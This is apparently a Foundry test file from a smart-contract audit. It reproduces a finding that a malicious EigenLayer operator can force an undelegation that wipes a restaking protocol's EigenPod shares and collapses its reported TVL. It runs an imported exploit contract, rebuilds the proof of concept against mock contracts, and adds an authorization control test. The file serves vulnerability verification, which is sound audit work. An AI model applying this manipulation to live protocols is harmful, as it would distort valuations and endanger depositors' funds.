// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30898-h-3-malicious-operators-can-undelegate-theirselves-to-manipu.sol";

contract UndelegateRemovesEigenPodSharesTest is Test {
    Exploit internal exploit;

    function setUp() public {
        exploit = new Exploit();
    }

    function test_exploit() public {
        exploit.run();

        OperatorDelegator delegator = exploit.delegator();
        AssetRegistry assetRegistry = exploit.assetRegistry();

        // Re-assert the harm from outside run(): EigenPod shares are gone and
        // TVL crashed to just the deposit pool buffer.
        assertEq(delegator.getEigenPodShares(), 0, "EigenPod shares should be zero after forced undelegation");
        assertEq(assetRegistry.getTVLForAsset(), 0.01 ether, "TVL should have crashed to the deposit pool buffer only");
    }

    /// @notice EOA-driven rebuild mirroring the finding's own PoC structure
    ///         (`test_UndelegateRemovesEigenPodShares`), using vm.prank for
    ///         the operator's forced-undelegation call instead of a helper
    ///         contract.
    function test_UndelegateRemovesEigenPodShares_EOA() public {
        MockEigenPodManager eigenPodManager = new MockEigenPodManager();
        MockDelegationManager delegationManager = new MockDelegationManager(address(eigenPodManager));
        OperatorDelegator delegatorContract = new OperatorDelegator(address(eigenPodManager));
        AssetRegistry assetRegistry = new AssetRegistry();

        address operatorEOA = address(0xE1);

        assetRegistry.setDepositPoolBalance(0.01 ether);
        assetRegistry.addDelegator(address(delegatorContract));

        delegationManager.delegateTo(address(delegatorContract), operatorEOA);
        eigenPodManager.creditShares(address(delegatorContract), int256(32 * 5 * 1e18));

        // @review all ether is in eigen pod shares
        assertEq(uint256(delegatorContract.getEigenPodShares()), 32 * 5 * 1e18);
        // @review the TVL is the 32*5 ether and the initial deposit
        assertEq(assetRegistry.getTVLForAsset(), 160010000000000000000);

        // @review undelegate from the operator
        vm.prank(operatorEOA);
        delegationManager.undelegate(address(delegatorContract));

        // @review eigenpod shares are removed fully
        assertEq(uint256(delegatorContract.getEigenPodShares()), 0);
        // @review the TVL is only the initial deposit
        assertEq(assetRegistry.getTVLForAsset(), 10000000000000000);
    }

    /// @notice Control: the STAKER (delegator) undelegating ITSELF is the
    ///         intended, harmless path (e.g. the protocol voluntarily
    ///         rotating away from an operator via its own governance flow —
    ///         out of scope here, but the authorization check itself is
    ///         still exercised): only the staker or its delegated operator
    ///         may call undelegate; an unrelated third party cannot.
    function test_control_unauthorizedCallerCannotUndelegate() public {
        MockEigenPodManager eigenPodManager = new MockEigenPodManager();
        MockDelegationManager delegationManager = new MockDelegationManager(address(eigenPodManager));
        OperatorDelegator delegatorContract = new OperatorDelegator(address(eigenPodManager));

        address operatorEOA = address(0xE1);
        address randomEOA = address(0xBAD);

        delegationManager.delegateTo(address(delegatorContract), operatorEOA);
        eigenPodManager.creditShares(address(delegatorContract), int256(32 * 5 * 1e18));

        vm.prank(randomEOA);
        vm.expectRevert(bytes("not authorized to undelegate"));
        delegationManager.undelegate(address(delegatorContract));

        // EigenPod shares remain untouched.
        assertEq(uint256(delegatorContract.getEigenPodShares()), 32 * 5 * 1e18);
    }
}
